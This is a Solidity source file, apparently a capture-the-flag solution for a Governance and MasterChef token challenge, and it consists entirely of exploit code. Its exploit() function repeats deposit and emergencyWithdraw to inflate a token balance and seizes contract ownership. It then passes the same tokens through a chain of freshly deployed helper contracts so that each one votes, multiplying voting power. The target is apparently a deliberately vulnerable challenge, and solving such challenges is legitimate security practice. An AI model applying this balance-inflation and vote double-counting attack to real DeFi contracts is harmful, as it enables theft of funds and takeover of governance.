pragma solidity ^0.6.12;

import "../challenge8/Governance.sol";

contract transferandvote {
    Governance Gov;
    MasterChef vuln;
    address EOA;

    function transfer(
        address _gov,
        address _EOA,
        address _next
    ) public {
        Gov = Governance(_gov);
        EOA = _EOA;
        vuln = MasterChef(Gov.masterChef());
        vuln.transferOwnership(address(this));
        Gov.vote(EOA);
        vuln.transfer(_next, vuln.balanceOf(address(this)));
    }
}

contract GovernanceSolution {
    Governance Gov;
    MasterChef vuln;
    address EOA;

    constructor(address _gov, address _EOA) public {
        Gov = Governance(_gov);
        vuln = MasterChef(Gov.masterChef());
        EOA = _EOA;
    }

    function exploit() public {
        vuln.airdorp();
        vuln.airdorp();
        vuln.approve(address(vuln), 2**256 - 1);
        for (uint256 i; i < 22; i++) {
            uint256 amount = vuln.balanceOf(address(this));
            vuln.deposit(0, amount);
            vuln.emergencyWithdraw(0);
        }
        vuln.emergencyWithdraw(0);
        vuln.withdraw(0, 1611392);
        vuln.transferOwnership(address(this));
        Gov.vote(EOA);
        transferandvote firsttransferandvote = new transferandvote();
        vuln.transfer(
            address(firsttransferandvote),
            vuln.balanceOf(address(this))
        );
        for (uint256 i; i < 7; i++) {
            transferandvote newtransferandvote = new transferandvote();
            firsttransferandvote.transfer(
                address(Gov),
                EOA,
                address(newtransferandvote)
            );
            firsttransferandvote = newtransferandvote;
        }
    }
}
